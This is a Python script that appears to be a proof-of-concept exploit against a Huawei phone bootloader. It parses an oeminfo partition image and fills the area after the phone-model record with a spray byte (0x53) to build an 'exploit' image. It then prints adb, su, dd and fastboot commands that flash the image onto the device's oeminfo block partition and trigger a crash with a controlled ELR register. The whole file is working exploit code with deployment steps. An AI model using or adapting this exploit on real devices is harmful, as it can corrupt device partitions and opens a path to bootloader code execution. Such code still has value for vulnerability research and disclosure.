#!/usr/bin/python
import sys
import struct
import os

p = lambda v: struct.pack("<I", v)
u = lambda v: struct.unpack("<I", v)[0]
expected_prod_index = -1
SPRAY_BYTE = 0x53

KNOWN_INDEXES = { 38: "IMEI (Encrypted)", 60: "PHONE MODEL", 59: "BUILD NUMBER",
                  97: "USR_FASTBOOT_UNLOCK (Encrypted)", 18: "VENDOR_NAME",
                  43: "BOOT LOGO 1", 42: "BOOT LOGO 2", 41: "BOOT LOGO 1", 35: "ROOT TYPE INFO"}


def read_oem_info_record(contents, num_entries_to_read=1):
    """
    Interpret the provided contents as Huawei OEM records and read them.
    
    set the global variable expected_prod_index to the index
    where product num starts.
    
    :param contents: Content to be parsed.
    :param num_entries_to_read: number of entries to read.
    :return: number of records read successfully
    """
    expected_preamble = "OEM_INFO"
    num_read = 0
    curr_index = 0
    global expected_prod_index
    while num_read < num_entries_to_read:
        try:
            preamble_index = contents.index(expected_preamble, curr_index)
            strean_indx = preamble_index + 8 + 4
            info_id = u(contents[strean_indx: strean_indx+4])
            strean_indx += 4
            num_blocks = u(contents[strean_indx: strean_indx + 4])
            strean_indx += 4
            curr_block_num = u(contents[strean_indx: strean_indx + 4])
            strean_indx += 4
            total_entry_len = u(contents[strean_indx: strean_indx + 4])
            index_name = str(info_id)
            if info_id in KNOWN_INDEXES:
                index_name = KNOWN_INDEXES[info_id]
            #print "[$] Entry, Index:" + index_name + ", Length:" + str(total_entry_len) + \
            #      ", Num Blocks:" + str(num_blocks)
            # This is where data starts
            data_starts = curr_index + 512
            if info_id == 60:
                # print "Modifying Phone Model\n"
                expected_prod_index = data_starts
                break
            if num_blocks == 1:
                data_cont = contents[data_starts: data_starts + total_entry_len]
                # print "[$] Data:" + str(data_cont) + "\n"
            else:
                # print "[$] Data too long to display\n"
                pass
            curr_index = preamble_index + 0x4000
            num_read += 1
        except Exception as e:
            break

    return curr_index, num_read


def main():
    if len(sys.argv) < 3:
        print "[!] Usage: " + sys.argv[0] + " <oeminfo.img> <exploit_oeminfo.img>\n"
        sys.exit(-1)

    oem_img_file = sys.argv[1]
    output_oem_img_file = sys.argv[2]
    if not os.path.exists(oem_img_file):
        print "[!] Provided OEM INFO Image:" + oem_img_file + " does not exist."
        sys.exit(-1)

    fp = open(oem_img_file, "rb")
    oem_cont = fp.read()
    fp.close()
    curr_index = 0
    total_records_read = 0
    read_oem_info_record(oem_cont, 400)
    # print "[*] Successfully read:" + str(total_records_read) + " OEM_INFO records."
    if expected_prod_index != -1:
        print "[+] Found the index of the product numer entry at:" + str(expected_prod_index)
        print "[*] Modifying..Spraying with:" + hex(SPRAY_BYTE)
        by = bytearray()
        by.extend(oem_cont)
        for me in range(0x3dff):
            by[expected_prod_index + me] = SPRAY_BYTE
        print "[+] Writing exploit oeminfo image to:" + output_oem_img_file
        fp = open(output_oem_img_file, 'wb')
        fp.write(by)
        fp.close()        
        base_output_fname = os.path.basename(output_oem_img_file)
        print "[*] Run the following commands:"
        print "   [**] From Host:"
        print "        adb push " + str(output_oem_img_file) +  " /sdcard/"
        print "   [**] From device:"
        print "        su"
        print "        cd /sdcard"
        print "        dd if=" + base_output_fname + " of=/dev/block/platform/hi_mci.0/by-name/oeminfo"
        print "   [**] From Host:"
        print "        adb reboot bootloader"
        print "   Wait till device enter reboots into bootloader"
        print "   [**] From Host:"
        print "        fastboot oem get-product-model"
        print "[$] SEE THE CRASH ON THE PHONE WITH ELR CONTAINING:" + hex(SPRAY_BYTE)
    else:
        print "[-] Unable to find product number entry in the provided oeminfo image"
    


if __name__ == "__main__":
    main()

